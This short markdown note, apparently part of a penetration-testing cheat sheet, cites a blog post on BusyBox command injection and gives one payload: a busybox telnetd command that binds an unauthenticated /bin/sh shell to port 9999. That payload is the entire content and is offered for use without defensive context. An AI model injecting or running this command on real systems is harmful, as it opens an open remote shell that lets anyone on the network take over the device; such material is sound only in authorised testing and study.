# Command Injection

> Reference: https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2010/february/busybox-command-injection/

## Bind a telnet shell to port 9999
```
/bin/busybox telnetd -l/bin/sh -p9999
```
